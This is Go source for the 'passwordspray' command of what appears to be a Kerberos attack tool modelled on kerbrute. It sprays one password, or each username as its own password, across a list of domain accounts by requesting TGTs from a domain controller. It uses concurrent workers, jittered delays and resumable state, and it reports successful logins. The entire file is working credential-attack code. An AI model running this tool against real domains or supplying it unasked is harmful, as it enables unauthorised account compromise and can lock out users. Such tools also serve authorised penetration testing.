package cmd

import (
	"bufio"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/incogbyte/gokbt/util"

	"github.com/spf13/cobra"
)

var usernameList string
var password string

var passwordSprayCmd = &cobra.Command{
	Use:   "passwordspray [flags] <username_wordlist> <password>",
	Short: "Test a single password against a list of users",
	Long: `Will perform a password spray attack against a list of users using Kerberos Pre-Authentication by requesting a TGT from the KDC.
If no domain controller is specified, the tool will attempt to look one up via DNS SRV records.
A full domain is required. This domain will be capitalized and used as the Kerberos realm when attempting the bruteforce.
Succesful logins will be displayed on stdout.
WARNING: use with caution - failed Kerberos pre-auth can cause account lockouts`,
	Args:   cobra.MinimumNArgs(1),
	PreRun: setupSession,
	Run:    passwordSpray,
}

func init() {
	passwordSprayCmd.Flags().BoolVar(&userAsPass, "user-as-pass", false, "Spray every account with the username as the password")
	rootCmd.AddCommand(passwordSprayCmd)

}

func passwordSpray(cmd *cobra.Command, args []string) {
	usernamelist := args[0]
	if !userAsPass {
		if len(args) != 2 {
			logger.Log.Error("You must specify a password to spray with, or --user-as-pass")
			os.Exit(1)
		} else {
			password = args[1]
		}
	} else {
		password = "foobar"
	}
	stopOnSuccess = stopOnSuccessFlag

	usersChan := make(chan string, threads)
	defer cancel()

	var total, blanks, invalid, deduped int
	seen := make(map[string]struct{})

	var wg sync.WaitGroup
	wg.Add(threads)

	var scanner *bufio.Scanner
	if usernamelist != "-" {
		file, err := os.Open(usernamelist)
		if err != nil {
			logger.Log.Error(err.Error())
			return
		}
		defer file.Close()
		scanner = bufio.NewScanner(file)
	} else {
		scanner = bufio.NewScanner(os.Stdin)
	}

	var err error
	validOutputWriter, err = util.NewValidOutputFile(outputValidFile)
	if err != nil {
		logger.Log.Errorf("Failed to open output file: %v", err)
		return
	}
	if validOutputWriter != nil {
		defer validOutputWriter.Close()
	}

	var lineCount int64
	if showProgress && usernamelist != "-" {
		lineCount, _ = util.CountLines(usernamelist)
	}
	progressBar = util.NewProgressBar(lineCount, showProgress && lineCount > 0, "Spray")
	progressBar.Start()

	var localResumeState *util.ResumeState
	if resumeFile != "" {
		if rs, err := util.LoadResumeState(resumeFile); err == nil {
			localResumeState = rs
			logger.Log.Infof("Resuming from %s, skipping %d already processed", resumeFile, len(rs.Processed))
		} else {
			localResumeState = util.NewResumeState(resumeFile, "passwordspray", usernamelist)
		}
	}

	for i := 0; i < threads; i++ {
		go makeSprayWorker(ctx, usersChan, &wg, password, userAsPass)
	}

	start := time.Now()

Scan:
	for scanner.Scan() {
		select {
		case <-ctx.Done():
			break Scan
		default:
			usernameline := scanner.Text()
			username, err := util.FormatUsername(usernameline)
			if err != nil {
				logger.Log.Debugf("[!] %q - %v", usernameline, err.Error())
				invalid++
				continue
			}
			total++
			if strings.TrimSpace(usernameline) == "" {
				blanks++
				continue
			}
			if _, ok := seen[username]; ok {
				deduped++
				continue
			}
			seen[username] = struct{}{}

			if localResumeState != nil && localResumeState.IsProcessed(username) {
				continue
			}

			time.Sleep(util.JitterDelay(delay, jitter))
			usersChan <- username

			if localResumeState != nil {
				localResumeState.MarkProcessed(username)
			}
		}
	}
	close(usersChan)
	wg.Wait()
	progressBar.Stop()

	if localResumeState != nil {
		if err := localResumeState.Save(); err != nil {
			logger.Log.Errorf("Failed to save resume state: %v", err)
		}
	}

	finalCount := atomic.LoadInt32(&counter)
	finalSuccess := atomic.LoadInt32(&successes)
	logger.Log.Infof("Done! Tested %d logins (%d successes) in %.3f seconds", finalCount, finalSuccess, time.Since(start).Seconds())
	logger.Log.Infof("Input stats: total=%d blanks=%d invalid=%d deduped=%d sent=%d", total, blanks, invalid, deduped, len(seen))

	if err := scanner.Err(); err != nil {
		logger.Log.Error(err.Error())
	}

	if err := kSession.Close(); err != nil {
		logger.Log.Errorf("Error closing session: %s", err.Error())
	}
}
